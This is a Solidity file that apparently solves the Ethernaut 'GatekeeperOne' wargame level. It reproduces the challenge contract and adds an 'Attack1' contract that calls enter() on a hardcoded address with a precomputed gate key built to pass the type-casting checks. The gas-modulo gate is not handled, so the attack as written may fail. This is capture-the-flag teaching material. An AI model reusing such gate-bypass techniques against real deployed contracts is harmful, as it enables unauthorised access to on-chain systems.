pragma solidity ^0.4.18;

contract GatekeeperOne
{
  address public entrant;
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
  modifier gateTwo() {
    require(msg.gas % 8191 == 0);
    _;
  }
  modifier gateThree(bytes8 _gateKey) {
    require(uint32(_gateKey) == uint16(_gateKey));
    require(uint32(_gateKey) != uint64(_gateKey));
    require(uint32(_gateKey) == uint16(tx.origin));
    _;
  }
  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
contract Attack1
{
    bytes8 public v = 0x1000000000001d9d;
    function a() public
    {
        GatekeeperOne g_one = GatekeeperOne(0x7aabebfe0d7fb4bb07a95034e220134b95e2eaf5);
        g_one.enter(v);
    }
}
